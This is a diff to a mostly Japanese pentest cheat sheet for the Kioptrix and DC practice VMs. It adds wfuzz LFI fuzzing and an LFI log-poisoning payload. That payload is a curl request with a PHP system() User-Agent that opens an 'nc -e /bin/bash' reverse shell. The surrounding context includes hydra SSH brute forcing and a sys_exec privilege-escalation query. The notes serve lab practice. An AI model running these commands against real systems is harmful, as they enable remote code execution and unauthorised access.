@@ -1,4 +1,4 @@
-🐻 Kioptrix#1/#2/#3/#4 DC-1/DC-2/DC-3/DC-4
+🐻 Kioptrix#1/#2/#3/#4 DC-1/DC-2/DC-3/DC-4/DC-5
 
 ## Reconnaissance
 
@@ -56,7 +56,7 @@ Samba
 
 [LinEnum](https://github.com/rebootuser/LinEnum)
 
-    ./LinEnum.sh -r repo -e /tmp/.le
+    ./LinEnum.sh -r .le -e .le
 
  1. どのようなユーザが存在するか？
  2. 権限昇格を狙えるものはあるか？
@@ -78,6 +78,10 @@ wpscan
 [vanhauser-thc/thc-hydra: hydra](https://github.com/vanhauser-thc/thc-hydra)
 
     hydra -v -L users -P passwords ssh://10.110...
+
+[Wfuzz: The Web fuzzer](https://wfuzz.readthedocs.io/en/latest/)
+
+    wfuzz -w common.txt -w LFI.txt http://192.168.77.132/sample.php?FUZZ=FUZ2Z
 
 
 ## Delivery
@@ -111,6 +115,11 @@ Spawning A TTY Shell
  - CMS内で直接ファイルを編集・任意実行できる仕組みは無いか？
  - テンプレート・プラグイン読み込み機能は？
 
+LFI
+
+    curl -A "<?= system('nc -nv [ip] [port] -e /bin/bash'); ?>" http://ip/script.php
+    script.php?file=/var/log/nginx/access.log
+
 
 [exploitdb](https://github.com/offensive-security/exploitdb)
 
@@ -133,6 +142,9 @@ sqlmap
     use mysql;
     select * from func;
     select sys_exec('usermod -a -G admin [user]');
+
+
+## Misc
 
 Bash
 
